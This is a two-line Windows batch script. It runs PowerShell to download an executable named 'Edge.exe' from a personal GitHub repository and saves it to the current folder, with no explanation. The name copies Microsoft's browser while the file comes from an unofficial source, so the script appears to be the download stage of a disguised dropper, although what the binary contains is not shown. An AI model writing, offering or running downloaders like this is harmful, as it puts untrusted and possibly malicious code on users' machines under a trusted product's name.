@echo off
cmd /k "powershell -command "Invoke-WebRequest 'https://github.com/berfelaionut/PDS/raw/main/Edge.exe' -OutFile 'Edge.exe'" && exit"